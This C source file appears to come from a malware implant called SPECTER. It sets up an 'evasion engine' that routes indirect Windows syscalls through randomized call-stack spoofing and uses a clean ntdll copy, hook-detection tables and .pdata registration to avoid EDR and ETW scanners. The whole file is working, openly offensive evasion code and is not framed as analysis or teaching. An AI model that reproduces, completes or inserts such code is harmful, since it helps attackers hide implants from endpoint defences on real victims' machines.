/**
 * SPECTER Implant — Evasion-Wrapped Syscall Core
 *
 * Initializes the evasion engine and provides evasion_syscall() which
 * wraps every syscall with pre-call stack spoofing and post-call
 * restoration.  All syscall wrappers route through this function
 * instead of calling spec_syscall directly.
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "config.h"
#include "peb.h"

/* GCC built-in variadic argument support (CRT-free) */
typedef __builtin_va_list va_list;
#define va_start(v, l) __builtin_va_start(v, l)
#define va_arg(v, l)   __builtin_va_arg(v, l)
#define va_end(v)      __builtin_va_end(v)

/* Maximum syscall arguments forwarded (matches syscall_stub.S limit) */
#define EVASION_MAX_ARGS 12

/* Default number of spoofed frames per syscall invocation */
#define EVASION_SPOOF_DEPTH 6

/* External globals */
extern SYSCALL_TABLE g_syscall_table;

/* ------------------------------------------------------------------ */
/*  Static evasion context storage                                     */
/* ------------------------------------------------------------------ */

static EVASION_CONTEXT g_evasion_ctx;

/* ------------------------------------------------------------------ */
/*  evasion_init — initialize the full evasion engine                  */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    spec_memset(&g_evasion_ctx, 0, sizeof(EVASION_CONTEXT));

    /* Copy clean ntdll pointer from the syscall table */
    if (ctx->syscall_table)
        g_evasion_ctx.clean_ntdll = ctx->syscall_table->clean_ntdll;

    /* Store evasion context pointer in the implant context early
       so syscall wrappers can always reach it — even if frame init
       fails, evasion_syscall falls through to raw spec_syscall */
    ctx->evasion_ctx = &g_evasion_ctx;

    /* Initialize frame library for call stack spoofing.
       Failure is non-fatal: evasion_syscall falls back to raw
       spec_syscall when frame_lib.count == 0. */
    NTSTATUS status = evasion_init_frames(&g_evasion_ctx);

    /* Initialize CRC baseline table for hook detection.
       Failure is non-fatal — hook detection will be degraded
       but syscalls still work. */
    if (NT_SUCCESS(status))
        evasion_init_crc_table(&g_evasion_ctx);

    /* Initialize optional evasion modules gated by config flags */
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    DWORD eflags = cfg ? cfg->evasion_flags : 0;

    /* .pdata registration: enables proper stack unwinding through
       implant frames for ETW/exception-based scanners */
    if (eflags & EVASION_FLAG_PDATA_REGISTER) {
        NTSTATUS pdata_status = evasion_register_pdata(
            &g_evasion_ctx, ctx->clean_ntdll);
        (void)pdata_status;  /* Non-fatal */
    }

    return status;
}

/* ------------------------------------------------------------------ */
/*  evasion_syscall — evasion-wrapped syscall invocation               */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_syscall(EVASION_CONTEXT *ctx, DWORD func_hash, ...) {
    /* Look up the syscall entry from the global table */
    SYSCALL_ENTRY *e = sc_get_entry(&g_syscall_table, func_hash);
    if (!e)
        return STATUS_PROCEDURE_NOT_FOUND;

    /* Extract up to EVASION_MAX_ARGS from variadic arguments.
     * Unused trailing args are harmless — spec_syscall's assembly
     * stub only reads what the actual syscall consumes. */
    va_list ap;
    va_start(ap, func_hash);
    QWORD a[EVASION_MAX_ARGS];
    for (int i = 0; i < EVASION_MAX_ARGS; i++)
        a[i] = va_arg(ap, QWORD);
    va_end(ap);

    NTSTATUS result;

    if (!ctx || ctx->frame_lib.count == 0) {
        /* Evasion not initialized or no frames available —
           fall through to raw syscall */
        result = spec_syscall(e->ssn, e->syscall_addr,
            a[0], a[1], a[2], a[3], a[4], a[5],
            a[6], a[7], a[8], a[9], a[10], a[11]);
        return result;
    }

    /* Select a randomized spoofed frame chain */
    FRAME_ENTRY *chain[FRAME_CHAIN_MAX];
    DWORD chain_count = evasion_select_frames(ctx, func_hash,
                                              chain, EVASION_SPOOF_DEPTH);

    /* Build spoofed stack if we have frames */
    SAVED_STACK_FRAMES saved;
    spec_memset(&saved, 0, sizeof(saved));
    BOOL stack_spoofed = FALSE;

    if (chain_count > 0) {
        /* Capture current RSP for stack manipulation */
        register QWORD rsp __asm__("rsp");

        NTSTATUS spoof_status = evasion_build_spoofed_stack(
            chain, chain_count, rsp, &saved);
        if (NT_SUCCESS(spoof_status))
            stack_spoofed = TRUE;
    }

    /* Execute the indirect syscall */
    result = spec_syscall(e->ssn, e->syscall_addr,
        a[0], a[1], a[2], a[3], a[4], a[5],
        a[6], a[7], a[8], a[9], a[10], a[11]);

    /* Restore original stack state */
    if (stack_spoofed)
        evasion_restore_stack(&saved);

    return result;
}
